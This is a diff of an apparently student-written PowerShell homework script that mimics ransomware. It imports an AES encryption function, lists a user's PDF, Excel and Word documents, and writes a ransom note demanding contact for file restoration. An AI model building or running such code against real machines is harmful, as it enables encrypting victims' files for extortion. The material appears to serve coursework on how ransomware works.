@@ -1,3 +1,7 @@
+# By Hasan Hashim
+#I took the following code from:
+#https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
+
 <#
 .SYNOPSIS
 Encryptes or Decrypts Strings or Byte-Arrays with AES
@@ -139,7 +143,6 @@ function Invoke-AESEncryption {
     }
 }
 
-###https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
 
 # List the files in a directory and
 Get-ChildItem -recurse -Include *.pdf,*.xlsx,*.doc -Path ./Documents | Export-Csv -Path files.csv
@@ -153,18 +156,17 @@ foreach ($f in $fileList) {
 }
 
 # Message body
-$msg = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."
 
 # Readme.READ created
-$readMe = "C:\Users\Hasan\Desktop\Champlain-classes\New folder\SYS-320-01-main\Week13\Homework\Readme.READ"
+$mess = "C:\Users\Hasan\Desktop\Champlain-classes\SYS-320\Week13\Homework\Readme.READ"
 
 # $msg added to $Readme.READ
-Write-Output $msg > $readME
+Write-Output "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you." > "C:\Users\Hasan\Desktop\Champlain-classes\SYS-320\Week13\Homework\Readme.READ"
 
-# Checks if copied file exists
-if (Test-Path -Path $readMe){
-    write-host "The File is Found"
+# Checks if Readme.READ file exists
+if (Test-Path -Path $mess){
+    write-host "Good, the File is Found at the right path"
 }
 else{
-    write-host "Error"
+    write-host "The file did not found"
 }
